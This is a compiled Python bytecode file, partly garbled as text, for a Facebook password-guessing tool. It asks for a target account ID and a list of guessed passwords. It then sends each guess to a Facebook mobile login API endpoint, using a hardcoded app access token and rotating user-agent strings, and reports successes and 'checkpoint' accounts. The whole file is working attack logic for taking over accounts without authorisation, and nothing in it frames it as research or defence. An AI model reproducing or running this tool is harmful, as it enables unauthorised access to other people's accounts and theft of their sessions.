U
    �T`X	  �                	   @   s�  d dl Z d dlZd dlZd dlZd dlmZ d dlmZ d dlmZ e �	d� e j
�d�rde �d� ed� e�� Ze�d� ejej�� d	d
� dddddgZde�e�fge_ed�Zedd��:Zed�D ]*Zedeed	 � d �Ze�ed � q�W 5 Q R X edd��Ze� � Z!W 5 Q R X e!�"� Z#d Z$e$e%e#�k �r�e#e$ Z&e�de d e& d �Z'e�(e'�Z)de)k�r�ed� eed e& � �q�n4de)d k�r�ed� eed  e& � ned!e& � e$d	7 Z$�q.dS )"�    N)�
ThreadPool)�ConnectionError)�Browser�clearz	.pass.txtz�[1;94m
 _____              _                 _
|  ___|_ _  ___ ___| |__   ___   ___ | | __
| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
|  _| (_| | (_|  __/ |_) | (_) | (_) |   <
|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_
F�   )Zmax_timezyMozilla/5.0 (Linux; Android 6.0; MYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36ziMozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36z
User-Agentz[1;96mENTER ID[1;97m: �a�
   z[1;96mENTER PASSWORDS z	[1;97m: �
�rz�https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=z&locale=en_US&password=zH&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmZaccess_tokenz[1;92mLogin success�|zwww.facebook.comZ	error_msgz#[1;91mAccount Has Been Checkpoint z | z [1;91mworng passwords [1;97m> )*�osZrandomZ	mechanizeZjsonZmultiprocessing.poolr   Zrequests.exceptionsr   r   �system�path�exists�remove�print�brZset_handle_robotsZset_handle_refreshZ_httpZHTTPRefreshProcessorZ
useragentsZchoiceZ
addheaders�input�id�open�f�range�i�str�pwd�write�v�readZpas�
splitlinesZ	pass_list�count�lenZpw�data�load�q� r$   r$   �f.py�<module>   sN    



�

